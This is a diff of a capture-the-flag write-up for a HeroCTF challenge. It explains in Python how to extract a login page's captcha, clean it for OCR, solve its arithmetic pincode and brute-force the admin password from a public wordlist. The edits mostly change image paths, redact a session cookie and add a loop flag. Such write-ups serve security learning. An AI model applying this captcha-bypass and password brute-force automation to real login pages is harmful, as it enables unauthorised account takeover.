@@ -10,15 +10,15 @@ Format: Hero{}
 
 <u>Programming language :</u> Python 🐍
 
-This challenge leaves us with a login page with a captcha secure authentication. The objective of this one was to find a way to automate the login process in order to get the admin password which is in the following wordlist : https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/500-worst-passwords.txt
+This challenge leaves us with a login page with a captcha secure authentication. The objective of this one was to find a way to automate the login process in order to get the admin password which is in the following wordlist : https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/500-worst-passwords.txt 
 
-![Login_Page](Images/Login_Page.png)
+![Login_Page](images/Rerecaptcha_v1_Login_Page.png)
 
 Well, the wordlist was only 500 passwords long, but calculating each time the captcha is annoying as fuck. So, the first step was to recover a local copy of the captcha. To do it, we should get the URL encoded, base64 value present in the DOM and then convert and copy it into a PNG file. 
 
 ```python
 url = "http://chall3.heroctf.fr:8081/login"
-cookie = dict(session="f8b0c6a0-882e-435a-aa98-9e6f91f21d8b.MtJk-nZ5rJs8agOjjxIgNBeSrCU")
+cookie = dict(session="XXXXXXX")
 
 r = requests.get(url, cookies=cookie)
 
@@ -28,15 +28,15 @@ with open("Captcha.png", "wb") as f:
     f.write(base64.b64decode(unquote(img_b64.group(1))))
 ```
 
-![Captcha1](Images/Captcha1.png)
+![Captcha1](images/Rerecaptcha_v1_Captcha1.png)
 
 
 
 After getting a local version of the captcha, I tried some OCR tools to have an idea of their successful rate. I find out that they was missing most of the time. So, before continue I decided to try to make the captcha clearer. The idea was to keep only black pixel and converting all pixels of the least used colour which are in contact with at least 2 black pixels. The second part look weird, but you will understand with the following picture.
 
-![Captcha2](Images/Captcha2.png)
+![Captcha2](images/Rerecaptcha_v1_Captcha2.png)
 
-![Captcha3](Images/Captcha3.png)
+![Captcha3](images/Rerecaptcha_v1_Captcha3.png)
 
 Now, the code to make it possible :
 
@@ -273,7 +273,7 @@ for z in passwords:
             elif op1 == 'x' and op2 == 'x':
                 resultat = nb1 * nb2 * nb3
 
-############################################ Send payload #############################################
+########################################## Sending payload ############################################
 
             payload = {'username': 'admin', 'password': z, 'pincode': resultat}
             r2 = requests.post(url, payload, cookies=cookie)
@@ -285,6 +285,7 @@ for z in passwords:
                 pass
             else:
                 print('PASSWORD IS : '+z)
+                finish = True
                 break
         except:
             pass
@@ -296,6 +297,7 @@ for z in passwords:
 
 It took about 7.15 minutes to test 325 passwords for an average time of 1.34 second per password.
 
-![Result](Images/Result.png)
+![Result](images/Rerecaptcha_v1_Result.png)
 
-![Flag](Images/Flag.png)
+![Flag](images/Rerecaptcha_v1_Flag.png)
+
